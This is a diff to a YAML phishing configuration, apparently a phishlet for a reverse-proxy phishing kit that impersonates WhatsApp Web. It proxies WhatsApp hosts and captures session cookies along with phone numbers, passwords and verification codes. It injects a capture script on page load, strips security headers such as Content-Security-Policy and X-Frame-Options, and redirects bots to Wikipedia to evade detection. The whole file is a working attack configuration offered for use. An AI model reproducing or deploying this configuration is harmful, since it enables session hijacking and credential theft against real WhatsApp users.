@@ -1,39 +1,82 @@
-name: "WhatsApp"
-author: "Vanta v5 Red Team"
+name: WhatsApp Web
+author: Vantablack Team
 min_ver: "5.0.0"
 proxy_hosts:
   - subdomain: "web"
     target: "web.whatsapp.com"
   - subdomain: "api"
     target: "api.whatsapp.com"
-auth_urls: 
+
+auth_urls:
+  - "/auth/login"
+  - "/api/login"
+  - "/v1/users/login"
+
+landing_path:
   - "/"
-  - "/auth"
+  - "/web"
   - "/login"
-landing_path: ["/"]
+
 auth_tokens:
-  - {type: "cookie", name: "wa_lang_pref"}
-  - {type: "cookie", name: "wa_ul"}
-  - {type: "cookie", name: "wa_csrf"}
+  - type: "cookie"
+    name: "wa_session"
+    regex: ".*"
+  - type: "cookie"
+    name: "wa_token"
+    regex: ".*"
+  - type: "cookie"
+    name: "session_id"
+    regex: ".*"
+
 credentials:
-  - {type: "post_param", name: "phone", regex: "^\\+[0-9]{1,15}$"}
-  - {type: "post_param", name: "code", regex: "^[0-9]{6}$"}
+  - type: "post_param"
+    name: "phone"
+    regex: "^\\+[0-9]{1,15}$"
+  - type: "post_param"
+    name: "password"
+    regex: null
+  - type: "post_param"
+    name: "code"
+    regex: "^[0-9]{6}$"
+  - type: "post_param"
+    name: "verification_code"
+    regex: "^[0-9]{6}$"
+
 injections:
-  - {type: "js", path: "/core/assets/js/capture.js", trigger: "load"}
+  - type: "js"
+    path: "/core/assets/js/capture.js"
+    trigger: "load"
+
 headers:
-  - {action: "remove", name: "Content-Security-Policy"}
-  - {action: "remove", name: "X-Frame-Options"}
-  - {action: "remove", name: "X-Content-Type-Options"}
-path_rewrites:
-  - {pattern: "^/$", replace: "/", methods: ["GET"]}
-cookie_rewrites: []
-blocklist:
-  - {pattern: "analytics|tracking|/gtm/", mimes: ["text/javascript"], max_kb: 512}
-form_actions:
-  - {selector: "form[action*='verify']", action_to: "/api/verify"}
-bridges:
-  - {prefix: "/_api/", target_host: "api.whatsapp.com", strip_prefix: true, cors: "allow_all"}
+  - action: "remove"
+    name: "Content-Security-Policy"
+  - action: "remove"
+    name: "X-Frame-Options"
+  - action: "remove"
+    name: "X-XSS-Protection"
+
 cors:
   mode: "allow_all"
   methods: ["GET", "POST", "OPTIONS"]
   headers: ["*"]
+
+fingerprint:
+  user_agents:
+    - "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    - "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    - "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
+
+  mobile_user_agents:
+    - "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
+    - "Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
+
+  referers:
+    - "https://web.whatsapp.com/"
+    - "https://whatsapp.com/"
+    - "https://www.google.com/"
+
+stealth:
+  block_bots: true
+  redirect_bots: "https://www.wikipedia.org"
+  mobile_only: false
+  geo_block: false
